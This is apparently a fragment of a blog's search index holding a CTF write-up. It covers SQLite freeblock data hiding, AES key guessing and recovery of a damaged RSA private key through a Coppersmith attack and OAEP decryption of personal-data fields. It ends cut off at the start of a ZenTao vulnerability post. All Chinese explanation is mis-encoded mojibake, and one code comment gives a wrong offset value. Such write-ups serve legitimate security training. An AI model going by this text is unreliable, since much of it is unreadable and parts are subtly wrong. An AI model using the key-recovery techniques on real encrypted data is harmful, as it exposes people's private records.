\u0026#39;\\n\\n\\n\\n\\n\\n\\n\\n\\n\\nflag{\u0026#39;+char # print(test.encode()) test_key = long_to_bytes(bytes_to_long(hint_b) ^ bytes_to_long(test_msg.encode())) encryption = AES.new(test_key, AES.MODE_CBC, iv=IV_fake) p = encryption.decrypt(enc_b) if \u0026#39;}\\\\x10\u0026#39; in str(p): print(p) print(test_msg) # flag{IADMIN-TOP-18880101-7634567_2025} æ•°æ®éšè— é¢˜ç›® æŸæ±½è½¦ä¾›åº”é“¾ç‰©æµä¸­å°æ­£åœ¨è¿›è¡Œå­£åº¦æ•°æ®å½’æ¡£ï¼Œç”±äºå½’æ¡£ä»»åŠ¡å ç”¨äº†ä¸»ç´¢å¼•èµ„æºï¼Œè¿ç»´å›¢é˜Ÿå¯ç”¨äº†ä¸€å¥—â€œåº•å±‚åº”æ€¥ç´¢å¼•æœºåˆ¶â€ã€‚è¯¥æœºåˆ¶å¹¶ä¸ä¾èµ– SOLite åŸç”Ÿçš„ç´¢å¼•ï¼Œè€Œæ˜¯è®¾è®¡äº†ä¸€å¥—è‡ªå®šä¹‰çš„è·¨é¡µé“¾è¡¨åè®®ï¼Œå°†å…³é”®ç­›é€‰é€»è¾‘ç¢ç‰‡åŒ–åœ°å­˜å‚¨åœ¨æ•°æ®åº“æ–‡ä»¶çš„ç‰©ç†ç©ºé—²å— (Freeblocks) æ•°æ®åŒºä¸­ã€‚ è¯·æ£€æŸ» sys_config è¡¨ï¼Œè·å–åº•å±‚é“¾è¡¨çš„å…¥å£æŒ‡é’ˆä»¥åŠè‡ªå®šä¹‰é“¾è¡¨èŠ‚ç‚¹çš„ç»“æ„å®šä¹‰ã€‚æ ¹æ®ç»“æ„å®šä¹‰ï¼Œä»åº•å±‚ç‰©ç†ç©ºé—´ä¸­æå–å¹¶é‡ç»„å‡ºâ€œç‰¹å®šæ‰¹æ¬¡è´§ç‰©ç­›é€‰è„šæœ¬â€(SQL)ã€‚éšå†™æ•°æ®ä½äº SQLite Freeblock çš„æœ‰æ•ˆè½½è·åŒº(è·³è¿‡ Freeblock è‡ªèº«çš„4å­—èŠ‚å¤´éƒ¨)ã€‚æ•°æ®ç»è¿‡äº†å¼‚æˆ–å¤„ç†ï¼Œå¯†é’¥ä¸æ‰€åœ¨ç‰©ç†é¡µå·æœ‰å…³ã€‚è¿è¡Œæå–å‡ºçš„è„šæœ¬ï¼Œå®šä½å‡ºè¯¥æ‰¹æ¬¡é›·è¾¾æ¨¡ç»„æ‰€åœ¨çš„ é›†è£…ç®±ç¼–å·(containerid)å’Œè½¦ç‰Œå·(license_plate)ï¼Œæœ€ç»ˆéœ€è¦å°† container_id å’Œlicense_plate çš„åäº”ä½æ•°å­—ä½¿ç”¨ä¸‹åˆ’çº¿è¿æ¥æäº¤ï¼Œä¾‹å¦‚:CN2877541671_72345ã€‚\nè§£ç­” å…ˆçœ‹sys_config è¡¨\n1 2 3 recovery.pointer\tERR_PTR: 0000013B:04F0 Start address of emergency chain recovery.structure\tStruct: \u0026gt;IHH (NextPage, NextOff, Len)\tCustom header inside freeblocks recovery.encryption\tXOR_PAGE_ID_BE\tEncryption mode èµ·å§‹ä½ç½®\npage=0x13B offset=0x04F0 â€‹èŠ‚ç‚¹ç»“æ„ â€‹\u0026gt;IHHâ€‹ï¼š\nâ€‹I (4å­—èŠ‚): NextPage - ä¸‹ä¸€èŠ‚ç‚¹é¡µé¢å· â€‹H (2å­—èŠ‚): NextOff - ä¸‹ä¸€èŠ‚ç‚¹é¡µå†…åç§» â€‹H (2å­—èŠ‚): Len - å½“å‰ payload é•¿åº¦ XOR_PAGE_ID_BE æ˜¯åŠ å¯†æ¨¡å¼çš„æè¿°\nXORï¼š å¼‚æˆ–è¿ç®— PAGE_IDï¼šé¡µé¢å·ï¼ˆå½“å‰æ•°æ®æ‰€åœ¨çš„ SQLite é¡µé¢ç¼–å·ï¼‰ BEï¼š Big-Endianï¼ˆå¤§ç«¯åºï¼‰ åŠ å¯†æ¨¡å¼å…·ä½“å«ä¹‰\nå¯¹ payload æ•°æ®è¿›è¡Œ XOR è§£å¯†æ—¶ï¼š\nå–å½“å‰èŠ‚ç‚¹æ‰€åœ¨çš„â€‹é¡µé¢å·ï¼ˆå¦‚ç¬¬ 2 é¡µã€ç¬¬ 5 é¡µç­‰ï¼‰ å°†é¡µé¢å·è½¬ä¸º 4 å­—èŠ‚ Big-Endian æ ¼å¼ï¼ˆé«˜ä½åœ¨å‰ï¼‰ ç”¨è¿™ 4 å­—èŠ‚ä½œä¸ºå¯†é’¥ï¼Œå¾ªç¯å¼‚æˆ– payload çš„æ¯ä¸ªå­—èŠ‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import struct DB_FILE = r\u0026#39;D:\\Challenges\\2025ç¬¬ä¸‰å±Šæ•°ä¿¡æ¯\\æ•°æ®éšè—\\sqlite.db\u0026#39; # SQLiteæ•°æ®åº“æ–‡ä»¶è·¯å¾„ START_PAGE = 0x13B # 315 START_OFF = 0x04F0 # 1264 PAGE_SIZE = 4096 # SQLiteé»˜è®¤é¡µå¤§å°ï¼Œå•ä½å­—èŠ‚ page = 0x13B # 315 offset = 0x04F0 # 1656 PAGE_SIZE = 4096 # SQLiteé»˜è®¤é¡µå¤§å°ï¼Œå•ä½å­—èŠ‚ with open(DB_FILE, \u0026#39;rb\u0026#39;) as f: fragments = [] while page != 0: f.seek((page-1) * PAGE_SIZE + offset) header = f.read(8) # 4+2+2 = 8å­—èŠ‚ next_page, next_off, payload_len = struct.unpack(\u0026#39;\u0026gt;IHH\u0026#39;, header) # print(next_page, next_off, payload_len) f.seek((page-1) * PAGE_SIZE + +offset+8) payload = f.read(payload_len) key = struct.pack(\u0026#39;\u0026gt;I\u0026#39;, page) decrypted = bytes(b ^ key[i % 4] for i, b in enumerate(payload)) # print(decrypted) fragments.append(decrypted) page = next_page offset = next_off print(b\u0026#39;\u0026#39;.join(fragments)) æŠŠé‡Œé¢çš„16è¿›åˆ¶è½¬ä¹‰ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 SELECT t1.container_id, t2.license_plate FROM orders t1 JOIN drivers t2 ON t1.driver_id = t2.driver_id WHERE t1.route_path LIKE \u0026#39;%æ·±åœ³è½¬è¿ä¸­å¿ƒ%\u0026#39; AND t1.weight_kg BETWEEN 45.50 AND 45.60 AND t2.phone LIKE \u0026#39;%9527\u0026#39; AND t1.handling_code = \u0026#39;LIDAR_QC_HOLD\u0026#39;; æ•°æ®æ¢å¤ é¢˜ç›® æŸå…¬å¸æˆªè·åˆ°å¯†é’¥æ–‡ä»¶ä»¥åŠè„±æ•åçš„æ–‡ä»¶ï¼Œå‘ç°å¯†é’¥æ–‡ä»¶ä¸­çš„å‚æ•°å­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œç»“åˆå¯†é’¥æ–‡ä»¶æä¾›åˆ†æï¼Œå‘ç°å¯èƒ½é‡‡ç”¨å˜å¼‚RSAç®—æ³•é’ˆå¯¹é‡è¦æ–‡ä»¶è¿›è¡Œè„±æ•å¤„ç†ã€‚è¯·ç»“åˆæä¾›é™„ä»¶å†…å®¹ï¼Œè¿›è¡Œåˆ†æå¹¶è„±æ•æ¢å¤ï¼Œæ‰¾åˆ°PhoneNumberä¸º17962732783å¯¹åº”çš„idã€IndentificationCardã€BankCardï¼Œå¹¶ä»¥_è¿›è¡Œè¿æ¥å¹¶æäº¤ã€‚å¦‚idä¸º1ï¼ŒIndentificationCardä¸º2345ï¼ŒBankCardä¸º6789ï¼Œæœ€ç»ˆæäº¤1_2345_6789ã€‚\n1 2 3 -----BEGIN RSA PRIVATE KEY----- MIICWgIBAAKBgQCjev23ZhgE9HGeCV1PFxf1Mcs4AVX0kp2mXIpEkWXtrQ/Jwtsq172SQlHxaUEAwQ+btP7dN79qa0v0EMrRsV62o7EBWws7u65tTk7ZFNlyH5zIyGQK+zo1vDCxYZTQzE5xB+TOplJv4Xqga9vJ+x5tR/5ZAgBRNtm3BceE0gEduQIDAQABAoGAbQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAO0CPwCdAlFg1W1JcTY/PPLOfj6WIVxQv1DQzGBvVkXefsET0W2TE4PmSbwscyhJnSGeKYK3Jq5BxTcKqAAAAAAAAAJBAKoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAI8CQQDJAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVAkAWAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACnAkASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAv -----END RSA PRIVATE KEY----- è§£ç­” æ ¹æ®æŸåçš„å¯†é’¥æ–‡ä»¶å¯çŸ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # RSA å‚æ•° (åå…­è¿›åˆ¶ + ä½é•¿) n (1024 bits) = 0xa37afdb7661804f4719e095d4f1717f531cb380155f4929da65c8a449165edad0fc9c2db2ad7bd924251f1694100c10f9bb4fedd37bf6a6b4bf410cad1b15eb6a3b1015b0b3bbbae6d4e4ed914d9721f9cc8c8640afb3a35bc30b16194d0cc4e7107e4cea6526fe17aa06bdbc9fb1e6d47fe5902005136d9b705c784d2011db9 e (17 bits) = 0x10001 # p çš„å·²çŸ¥é«˜ä½ (ä½ 48 bits æœªçŸ¥) p (496 bits), å·²çŸ¥é«˜ 448 bits: p_high = 0x9d025160d56d4971363f3cf2ce7e3e96215c50bf50d0cc606f5645de7ec113d16d931383e649bc2c7328499d219e2982b726ae41c5370aa8 unknown_bits = 48 # å…¶ä»–å‚æ•°ä½é•¿ä¸é¦–å°¾å­—èŠ‚ (å¦‚å¯ç”¨) q (512 bits), high_byte=0xaa, low_byte=0x8f dp (512 bits), high_byte=0xc9, low_byte=0x15 dq (509 bits), high_byte=0x16, low_byte=0xa7 qinv (509 bits), high_byte=0x12, low_byte=0x2f d (1023 bits), high_byte=0x6d, low_byte=0xed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; ä»æŸåçš„ RSA PEM ç§é’¥æ–‡ä»¶ä¸­æå–æœ‰ç”¨ä¿¡æ¯ \u0026#34;\u0026#34;\u0026#34; import base64 def read_pem(filepath): \u0026#34;\u0026#34;\u0026#34;è¯»å– PEM æ–‡ä»¶å¹¶è§£ç  Base64\u0026#34;\u0026#34;\u0026#34; with open(filepath, \u0026#39;r\u0026#39;) as f: lines = f.readlines() b64_data = \u0026#39;\u0026#39; for line in lines: line = line.strip() if line.startswith(\u0026#39;-----\u0026#39;): continue b64_data += line return base64.b64decode(b64_data) def parse_asn1_integer(data, offset): \u0026#34;\u0026#34;\u0026#34;è§£æ ASN.1 INTEGER\u0026#34;\u0026#34;\u0026#34; if offset \u0026gt;= len(data) or data[offset] != 0x02: return None, offset offset += 1 length = data[offset] offset += 1 if length \u0026amp; 0x80: num_bytes = length \u0026amp; 0x7f length = int.from_bytes(data[offset:offset+num_bytes], \u0026#39;big\u0026#39;) offset += num_bytes int_bytes = data[offset:offset+length] value = int.from_bytes(int_bytes, \u0026#39;big\u0026#39;) return value, offset + length def parse_rsa_private_key(der_data): \u0026#34;\u0026#34;\u0026#34;è§£æ RSA ç§é’¥çš„ DER ç¼–ç \u0026#34;\u0026#34;\u0026#34; offset = 0 if der_data[offset] != 0x30: return None offset += 1 length = der_data[offset] offset += 1 if length \u0026amp; 0x80: num_bytes = length \u0026amp; 0x7f offset += num_bytes field_names = [\u0026#39;version\u0026#39;, \u0026#39;n\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;d\u0026#39;, \u0026#39;p\u0026#39;, \u0026#39;q\u0026#39;, \u0026#39;dp\u0026#39;, \u0026#39;dq\u0026#39;, \u0026#39;qinv\u0026#39;] values = {} for name in field_names: value, offset = parse_asn1_integer(der_data, offset) if value is not None: values[name] = value else: break return values def extract_useful_info(values): \u0026#34;\u0026#34;\u0026#34;æå–æœ‰ç”¨ä¿¡æ¯\u0026#34;\u0026#34;\u0026#34; print(\u0026#34;=\u0026#34; * 60) print(\u0026#34;RSA ç§é’¥æå–ç»“æœ\u0026#34;) print(\u0026#34;=\u0026#34; * 60) n = values.get(\u0026#39;n\u0026#39;) e = values.get(\u0026#39;e\u0026#39;) d = values.get(\u0026#39;d\u0026#39;) p = values.get(\u0026#39;p\u0026#39;) q = values.get(\u0026#39;q\u0026#39;) dp = values.get(\u0026#39;dp\u0026#39;) dq = values.get(\u0026#39;dq\u0026#39;) qinv = values.get(\u0026#39;qinv\u0026#39;) # æå– p çš„å·²çŸ¥é«˜ä½ if p: p_hex = hex(p)[2:] trailing_zeros = len(p_hex) - len(p_hex.rstrip(\u0026#39;0\u0026#39;)) unknown_bits = trailing_zeros * 4 p_high = p \u0026gt;\u0026gt; unknown_bits if unknown_bits \u0026gt; 0 else p print(\u0026#34;\\n# RSA å‚æ•° (åå…­è¿›åˆ¶ + ä½é•¿)\u0026#34;) if n: print(f\u0026#34;n ({n.bit_length()} bits) = 0x{n:x}\u0026#34;) if e: print(f\u0026#34;e ({e.bit_length()} bits) = 0x{e:x}\u0026#34;) if p: total_p_bits = p.bit_length() if unknown_bits \u0026gt; 0: known_high_bits = total_p_bits - unknown_bits print(f\u0026#34;\\n# p çš„å·²çŸ¥é«˜ä½ (ä½ {unknown_bits} bits æœªçŸ¥)\u0026#34;) print(f\u0026#34;p ({total_p_bits} bits), å·²çŸ¥é«˜ {known_high_bits} bits: p_high = 0x{p_high:x}\u0026#34;) print(f\u0026#34;unknown_bits = {unknown_bits}\u0026#34;) else: print(f\u0026#34;\\n# p ({total_p_bits} bits) = 0x{p:x}\u0026#34;) # æå– q, dp, dq, qinv çš„å·²çŸ¥å­—èŠ‚ print(\u0026#34;\\n# å…¶ä»–å‚æ•°ä½é•¿ä¸é¦–å°¾å­—èŠ‚ (å¦‚å¯ç”¨)\u0026#34;) if q: try: q_bits = q.bit_length() q_bytes = q.to_bytes((q_bits + 7) // 8, \u0026#39;big\u0026#39;) print(f\u0026#34;q ({q_bits} bits), high_byte=0x{q_bytes[0]:02x}, low_byte=0x{q_bytes[-1]:02x}\u0026#34;) except OverflowError: pass if dp: try: dp_bits = dp.bit_length() dp_bytes = dp.to_bytes((dp_bits + 7) // 8, \u0026#39;big\u0026#39;) print(f\u0026#34;dp ({dp_bits} bits), high_byte=0x{dp_bytes[0]:02x}, low_byte=0x{dp_bytes[-1]:02x}\u0026#34;) except OverflowError: pass if dq: try: dq_bits = dq.bit_length() dq_bytes = dq.to_bytes((dq_bits + 7) // 8, \u0026#39;big\u0026#39;) print(f\u0026#34;dq ({dq_bits} bits), high_byte=0x{dq_bytes[0]:02x}, low_byte=0x{dq_bytes[-1]:02x}\u0026#34;) except OverflowError: pass if qinv: try: qinv_bits = qinv.bit_length() qinv_bytes = qinv.to_bytes((qinv_bits + 7) // 8, \u0026#39;big\u0026#39;) print(f\u0026#34;qinv ({qinv_bits} bits), high_byte=0x{qinv_bytes[0]:02x}, low_byte=0x{qinv_bytes[-1]:02x}\u0026#34;) except OverflowError: pass if d: try: d_bits = d.bit_length() d_bytes = d.to_bytes((d_bits + 7) // 8, \u0026#39;big\u0026#39;) print(f\u0026#34;d ({d_bits} bits), high_byte=0x{d_bytes[0]:02x}, low_byte=0x{d_bytes[-1]:02x}\u0026#34;) except OverflowError: pass if __name__ == \u0026#39;__main__\u0026#39;: filepath = r\u0026#39;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®æ¢å¤\\key_pri.pem\u0026#39; try: der_data = read_pem(filepath) values = parse_rsa_private_key(der_data) if values: extract_useful_info(values) except Exception as ex: print(f\u0026#34;é”™è¯¯: {ex}\u0026#34;) import traceback traceback.print_exc() å› ä¸ºnä¸º1024ä½ï¼Œqä¸º512ä½ï¼Œå› æ­¤æ¨æµ‹pä¹Ÿä¸º512ä½ï¼Œæœ‰é«˜16ä½æœªçŸ¥ï¼Œå› æ­¤ç¨‹åºè¯¯æŠ¥ä¸º496ä½\nå³å·²çŸ¥pçš„ç»“æ„ä¸º16 + 448(å·²çŸ¥) + 48\nnå·²çŸ¥ï¼Œeå·²çŸ¥\nå› æ­¤å¯ä»¥éå†é«˜16ä½ï¼ŒåšCoppersmithæ”»å‡»\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #Sage n = Integer(0xa37afdb7661804f4719e095d4f1717f531cb380155f4929da65c8a449165edad0fc9c2db2ad7bd924251f1694100c10f9bb4fedd37bf6a6b4bf410cad1b15eb6a3b1015b0b3bbbae6d4e4ed914d9721f9cc8c8640afb3a35bc30b16194d0cc4e7107e4cea6526fe17aa06bdbc9fb1e6d47fe5902005136d9b705c784d2011db9) p_known = Integer(0x9d025160d56d4971363f3cf2ce7e3e96215c50bf50d0cc606f5645de7ec113d16d931383e649bc2c7328499d219e2982b726ae41c5370aa8) pbits = 512 # pçš„ä½æ•° hbits = 16 # æœªçŸ¥16ä½é«˜ä½ lbits = 48 # æœªçŸ¥48ä½ä½ä½ print(\u0026#34;====== trying hack !!! ======\u0026#34;) # Coppersmithæ”»å‡» PR.\u0026lt;lp\u0026gt; = PolynomialRing(Zmod(n)) for hp in range(1 \u0026lt;\u0026lt; hbits,1,-1): # è¾“å‡ºè¿›åº¦ if hp % 1000 == 0: print(hex(hp),\u0026#34; of \u0026#34;, 1 \u0026lt;\u0026lt; hbits) test_p = (Integer(hp) \u0026lt;\u0026lt; (512-16)) + (p_known \u0026lt;\u0026lt; 48) + lp # 50æ˜¯ä¸ºäº†æ˜¯â€œç•¥å¤§äºæœªçŸ¥ä½æ•°â€çš„ä¿æŠ¤è£•é‡ï¼Œç¡®ä¿ small_roots èƒ½æœç´¢åˆ°çœŸå®çš„ p_low # å…³äº beta = 0.45ï¼šbeta æ§åˆ¶ç†è®ºæ¢å¤æ¡ä»¶ï¼ˆä¸å·²çŸ¥é«˜ä½æ¯”ä¾‹æœ‰å…³ï¼‰ï¼Œå¸¸ç”¨ç»éªŒå€¼åœ¨ 0.4â€“0.5 åŒºé—´ roots = test_p.small_roots(X=2^50, beta=0.45) if roots: p = (Integer(hp) \u0026lt;\u0026lt; (512-16)) + (p_known \u0026lt;\u0026lt; 48) + Integer(roots[0]) q = n // p print(\u0026#34;====== SUCCESS !!! ======\u0026#34;) print(f\u0026#39;n: {n}\u0026#39;) print(f\u0026#39;p: {p}\u0026#39;) print(f\u0026#39;q: {q}\u0026#39;) break è§£å‡ºpå’Œq\n1 2 3 4 p = 12878462475668980891688458616261003784858831336454571583609952190632795271670483299149893444276645867537740745994784742224790817486061554912749320101486391 q = 8914097078706231834651365689334575469686517068801737414666260678556477114364345584457623426741318622599741628404907424594363093944041411815871796251591311 n = 114799864732588688843518396777617821715231781884433300207048373456946985302497571534259572002054374342188682117755703990725304408314175730859833203345047593135879438759002962749125516153511748842154906106020044598244904756639111669917726068490351790461850539227887758512583535362600673113397153419850160348601 e = 65537 é¢˜ç›®æç¤ºç”¨äº†å˜å¼‚rsaç®—æ³•ï¼Œå› æ­¤çŒœæµ‹å¯èƒ½ç”¨PKCS#1è§„åˆ™æˆ–è€…OAEPè§„åˆ™ï¼Œè¿™æ˜¯ä¸¤ä¸ªä¸åŒçš„å¡«å……æ–¹å¼\néƒ½å°è¯•äº†å‘ç°ç”¨çš„æ˜¯OAEPè§„åˆ™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 import csv import base64 from typing import Optional, Tuple # è¯´æ˜ï¼šæ­¤è„šæœ¬ä½¿ç”¨ PyCryptodome å®ç° RSA-OAEP è§£å¯†ï¼Œç§é’¥å‚æ•°å†…è”ã€‚ # è¾“å‡ºæ–‡ä»¶ä¸º decrypted_users_pycrypto.csvï¼Œä»¥å…è¦†ç›–å…¶ä»–ç»“æœæ–‡ä»¶ã€‚ # === å†…è” RSA ç§é’¥å‚æ•°ï¼ˆæ¥è‡ª enc.pyï¼‰ === e = 65537 p = 12878462475668980891688458616261003784858831336454571583609952190632795271670483299149893444276645867537740745994784742224790817486061554912749320101486391 q = 8914097078706231834651365689334575469686517068801737414666260678556477114364345584457623426741318622599741628404907424594363093944041411815871796251591311 n = 114799864732588688843518396777617821715231781884433300207048373456946985302497571534259572002054374342188682117755703990725304408314175730859833203345047593135879438759002962749125516153511748842154906106020044598244904756639111669917726068490351790461850539227887758512583535362600673113397153419850160348601 def build_pycrypto_key(): \u0026#34;\u0026#34;\u0026#34;æ„é€  PyCryptodome çš„ RSA ç§é’¥å¯¹è±¡ï¼ˆå« CRT å‚æ•°ï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; from Crypto.PublicKey import RSA phi = (p - 1) * (q - 1) d = pow(e, -1, phi) # RSA.construct((n, e, d, p, q)) æˆ– (n,e,d,p,q) å‡å¯ï¼›ä½¿ç”¨ (n,e,d,p,q) ä»¥åŒ…å« CRT key = RSA.construct((n, e, d, p, q)) return key def decrypt_oaep_pycrypto(key, ct: bytes) -\u0026gt; Optional[Tuple[bytes, str]]: \u0026#34;\u0026#34;\u0026#34;ä½¿ç”¨ PyCryptodome çš„ PKCS1_OAEPï¼Œå…ˆè¯• SHA1ï¼Œå†è¯• SHA256ã€‚\u0026#34;\u0026#34;\u0026#34; from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA1, SHA256 for name, H in ((\u0026#39;SHA1\u0026#39;, SHA1), (\u0026#39;SHA256\u0026#39;, SHA256)): try: cipher = PKCS1_OAEP.new(key, hashAlgo=H) pt = cipher.decrypt(ct) return pt, name except Exception: continue return None cyphertext = \u0026#34;nXp80O3XBHBekOlXFBwNiJGFF9hQzp5EpzZf9RTfETbWmItbmeMVhc6dLh+TvEqEf4C2TLehQ/tzY4pnqswLnIQWiAUx79utwzIbbnobV5n1fTyZp9GZ9SuECT8GdWPbO1B+oZYTHG3/mD4iwIo08UZiijW400IDSzoRXWhhlCs=\u0026#34; ct = base64.b64decode(cyphertext) key = build_pycrypto_key() result = decrypt_oaep_pycrypto(key, ct) print(result) # è¾“å‡º (b\u0026#39;17659698488\u0026#39;, \u0026#39;SHA1\u0026#39;) æœ€ç»ˆè§£å¯†è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 import csv import base64 from typing import Optional, Tuple # è¯´æ˜ï¼šæ­¤è„šæœ¬ä½¿ç”¨ PyCryptodome å®ç° RSA-OAEP è§£å¯†ï¼Œç§é’¥å‚æ•°å†…è”ã€‚ # è¾“å‡ºæ–‡ä»¶ä¸º decrypted_users_pycrypto.csvï¼Œä»¥å…è¦†ç›–å…¶ä»–ç»“æœæ–‡ä»¶ã€‚ # === å†…è” RSA ç§é’¥å‚æ•°ï¼ˆæ¥è‡ª enc.pyï¼‰ === e = 65537 p = 12878462475668980891688458616261003784858831336454571583609952190632795271670483299149893444276645867537740745994784742224790817486061554912749320101486391 q = 8914097078706231834651365689334575469686517068801737414666260678556477114364345584457623426741318622599741628404907424594363093944041411815871796251591311 n = 114799864732588688843518396777617821715231781884433300207048373456946985302497571534259572002054374342188682117755703990725304408314175730859833203345047593135879438759002962749125516153511748842154906106020044598244904756639111669917726068490351790461850539227887758512583535362600673113397153419850160348601 def build_pycrypto_key(): \u0026#34;\u0026#34;\u0026#34;æ„é€  PyCryptodome çš„ RSA ç§é’¥å¯¹è±¡ï¼ˆå« CRT å‚æ•°ï¼‰ã€‚\u0026#34;\u0026#34;\u0026#34; from Crypto.PublicKey import RSA phi = (p - 1) * (q - 1) d = pow(e, -1, phi) # RSA.construct((n, e, d, p, q)) æˆ– (n,e,d,p,q) å‡å¯ï¼›ä½¿ç”¨ (n,e,d,p,q) ä»¥åŒ…å« CRT key = RSA.construct((n, e, d, p, q)) return key def decrypt_oaep_pycrypto(key, ct: bytes) -\u0026gt; Optional[Tuple[bytes, str]]: \u0026#34;\u0026#34;\u0026#34;ä½¿ç”¨ PyCryptodome çš„ PKCS1_OAEPï¼Œå…ˆè¯• SHA1ï¼Œå†è¯• SHA256ã€‚\u0026#34;\u0026#34;\u0026#34; from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA1, SHA256 for name, H in ((\u0026#39;SHA1\u0026#39;, SHA1), (\u0026#39;SHA256\u0026#39;, SHA256)): try: cipher = PKCS1_OAEP.new(key, hashAlgo=H) pt = cipher.decrypt(ct) return pt, name except Exception: continue return None def process_csv(infile: str = \u0026#39;encrypted_users.csv\u0026#39;, outfile: str = \u0026#39;decrypted_users_pycrypto.csv\u0026#39;) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34;è¯»å– CSVã€ç”¨ PyCryptodome è§£å¯†ç›®æ ‡åˆ—å¹¶å†™å›ç»“æœã€‚\u0026#34;\u0026#34;\u0026#34; key = build_pycrypto_key() with open(infile, newline=\u0026#39;\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: reader = csv.reader(f) header = next(reader) rows = list(reader) targets = [c for c in (\u0026#39;PhoneNumber\u0026#39;, \u0026#39;IndentificationCard\u0026#39;, \u0026#39;BankCard\u0026#39;) if c in header] target_idxs = [header.index(c) for c in targets] out_rows = [header] for r in rows: out = list(r) for idx in target_idxs: ct_b64 = r[idx].strip() if not ct_b64: out[idx] = \u0026#39;\u0026#39; continue try: ct = base64.b64decode(ct_b64) except Exception as ex: out[idx] = f\u0026#39;B64_ERROR:{ex}\u0026#39; continue result = decrypt_oaep_pycrypto(key, ct) if not result: out[idx] = \u0026#39;DECRYPT_FAIL\u0026#39; else: pt, alg = result try: out[idx] = pt.decode(\u0026#39;utf-8\u0026#39;) except Exception: out[idx] = pt.hex() out_rows.append(out) with open(outfile, \u0026#39;w\u0026#39;, newline=\u0026#39;\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: writer = csv.writer(f) writer.writerows(out_rows) print(\u0026#39;Wrote\u0026#39;, outfile) if __name__ == \u0026#39;__main__\u0026#39;: process_csv() ","date":"2026-01-01T18:16:49+08:00","permalink":"https://lantern-lab.github.io/post/2025-the-3rd-shuxin-cup-qxcuc.html","title":"2025ç¬¬ä¸‰å±Šæ•°ä¿¡æ¯WP"},{"content":"\nç¦…é“CNVD-2023-02709 ä¸€ã€å½±å“èŒƒå›´ æ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ \u0026gt;=17.4ï¼Œ\u0026lt;=18.0.beta1ï¼ˆå¼€æºç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ \u0026gt;=7.4ï¼Œ\u0026lt;=8.0.beta1ï¼ˆä¼ä¸šç‰ˆï¼‰\næ­å·æ˜“è½¯å…±åˆ›ç½‘ç»œç§‘æŠ€æœ‰é™å…¬å¸ ç¦…é“é¡¹ç›®ç®¡ç†ç³»ç»Ÿ \u0026gt;=3.4ï¼Œ\u0026lt;=4.0.beta1ï¼ˆæ——èˆ°ç‰ˆï¼‰\näºŒã€æ¼æ´åˆ†æ 2.0 å‰è¨€ ç¦…é“çš„è¯·æ±‚æ–¹å¼æœ‰PATH_INFOâ€‹å’ŒGETâ€‹ï¼Œå¯ä»¥é€šè¿‡è®¿é—®base_url + 